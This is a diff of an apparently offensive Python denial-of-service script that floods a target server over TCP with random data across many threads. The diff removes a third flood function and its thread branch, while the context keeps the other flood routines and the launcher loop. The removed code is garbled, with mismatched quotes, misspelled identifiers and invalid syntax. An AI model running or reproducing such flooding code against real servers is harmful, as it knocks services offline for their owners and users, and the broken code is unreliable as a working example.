@@ -60,30 +60,11 @@ def run2():
                         s.close()
                         print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")
 
-def run3():
-       data = random._urandom(1025)
-       i = random.choice(("[+],"[!]","[$]"))
-       while True:
-               try:
-                        s = socket.socket(socket.AF_INET, socker.SOCK_STREAM)
-                        s.connect((ip:port))
-                        s.send(data)
-                        for x in range(times):
-                                s.send(data)
-                        print(i +" SEND ATTACK!!!")
-               execept  
-                        s.close()
-                        print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")
-
 for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
                 th.start()
         else:
                 th = threading.Thread(target = run2)
-                th.start()
-
-        else: 
-                th = threading.Thread(target = run3)
                 th.start()
 
